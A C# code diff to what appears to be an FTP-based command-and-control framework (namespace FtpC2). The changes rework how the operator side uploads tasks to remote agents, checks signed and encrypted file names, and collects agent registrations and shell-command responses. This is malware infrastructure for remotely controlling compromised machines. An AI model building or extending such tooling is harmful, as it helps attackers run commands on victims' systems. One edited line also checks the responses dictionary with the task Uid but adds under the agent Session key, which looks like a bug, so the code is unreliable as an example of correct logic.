@@ -25,9 +25,16 @@ namespace FtpC2
 
         public void RegisterNewTask(TaskWrapper task)
         {
-            string jsonData = JsonSerializer.Serialize(task, task.GetType());            
+            string jsonData = JsonSerializer.Serialize(task, task.GetType());
 
-            UploadString(jsonData, $"{Shared.PlaceHolders.TaskRequest}.{task.Id}.{task.AgentId}");
+            string remoteFileName = PackRemoteFileName(
+                Shared.PlaceHolders.TaskRequest,
+                task.AgentId,
+                task.Id, // For file randomness                
+                PeerEncryptionHelper
+            );
+
+            UploadString(jsonData, remoteFileName);
         }
 
         public void RefreshAgents(ConcurrentDictionary<Guid /* AgentId */, Agent> agents)
@@ -35,23 +42,29 @@ namespace FtpC2
             List<string> files = ListDirectory();
 
             foreach (string file in files)
-            {
-                if (!file.StartsWith(Shared.PlaceHolders.AgentInformation))
-                    continue;
+            {               
+                var packedFileName = UnpackRemoteFileName(file);
+                if (packedFileName == null)
+                    continue; // Ignore
+
+                if (packedFileName.Name != Shared.PlaceHolders.AgentInformation)
+                    continue; // Ignore
                 try
                 {
-                    string[] pieces = file.Split(".");
-                    if (pieces.Length != 2)
-                        throw new Exception("The target file does not conform to the expected file name pattern.");
-                    
-                    Guid agentSession = Guid.Parse(pieces[1]);
+                    if (!packedFileName.Session.HasValue)
+                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");
+
+                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
+                        continue; // Ignore
 
                     string jsonData = DownloadString(file);
 
                     Agent? agent = JsonSerializer.Deserialize<Agent>(jsonData);
 
-                    if (agent != null && agent.Id == agentSession)                    
-                        agents.AddOrUpdate(agentSession, agent, (key, oldValue) => agent);                    
+                    if (agent != null && agent.Id == packedFileName.Session)
+                        agents.AddOrUpdate(agent.Id, agent, (key, oldValue) => agent);
+                    else
+                        throw new FormatException("File is corrupted or invalid.");
                 }
                 catch
                 {
@@ -74,50 +87,57 @@ namespace FtpC2
 
             foreach (string file in files)
             {
-                if (!file.StartsWith(Shared.PlaceHolders.ResponseRequest))
-                    continue;               
+                var packedFileName = UnpackRemoteFileName(file);
+                if (packedFileName == null)
+                    continue; // Ignore
+
+                if (packedFileName.Name != Shared.PlaceHolders.ResponseRequest)
+                    continue; // Ignore          
                 try
                 {
-                    string[] pieces = file.Split(".");
-                    if (pieces.Length != 3)
-                        throw new Exception("The target file does not conform to the expected file name pattern.");
+                    if (!packedFileName.Session.HasValue)
+                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");
 
-                    Guid taskSession = Guid.Parse(pieces[1]);
-                    Guid agentSession = Guid.Parse(pieces[2]);                        
-                
+                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
+                        continue; // Ignore                       
+
                     string jsonData = DownloadString(file);
 
                     ResponseWrapper? wrappedResponse = JsonSerializer.Deserialize<ResponseWrapper>(jsonData);
                     ResponseWrapper? response = null;
 
-                    if (wrappedResponse != null && wrappedResponse.TaskId == taskSession && wrappedResponse.AgentId == agentSession)
+                    if (
+                        wrappedResponse == null ||
+                        wrappedResponse.TaskId != packedFileName.Uid ||
+                        wrappedResponse.AgentId != packedFileName.Session
+                    )
+                        throw new FormatException("File is corrupted or invalid.");
+                   
+                    switch (wrappedResponse.ResponseType)
                     {
-                        switch (wrappedResponse.ResponseType)
-                        {
-                            case "ResponseShellCommand":
-                                {
-                                    response = JsonSerializer.Deserialize<ResponseShellCommand>(jsonData);                                 
+                        case "ResponseShellCommand":
+                            {
+                                response = JsonSerializer.Deserialize<ResponseShellCommand>(jsonData);                                 
 
-                                    break;
-                                }
+                                break;
+                            }
 
-                            case "ResponseNotification":
-                                {
-                                    response = JsonSerializer.Deserialize<ResponseNotification>(jsonData);
+                        case "ResponseNotification":
+                            {
+                                response = JsonSerializer.Deserialize<ResponseNotification>(jsonData);
 
-                                    break;
-                                }
+                                break;
+                            }
 
-                                // Add your additional response classes here
-                                // ...
-                        }
-
-                        if (response != null) 
-                        {
-                            if (!responses.ContainsKey(taskSession))
-                                responses.TryAdd(taskSession, response);
-                        }                            
+                            // Add your additional response classes here
+                            // ...
                     }
+
+                    if (response != null) 
+                    {
+                        if (!responses.ContainsKey(packedFileName.Uid.Value))
+                            responses.TryAdd(packedFileName.Session.Value, response);
+                    }                                              
                 }
                 catch
                 {
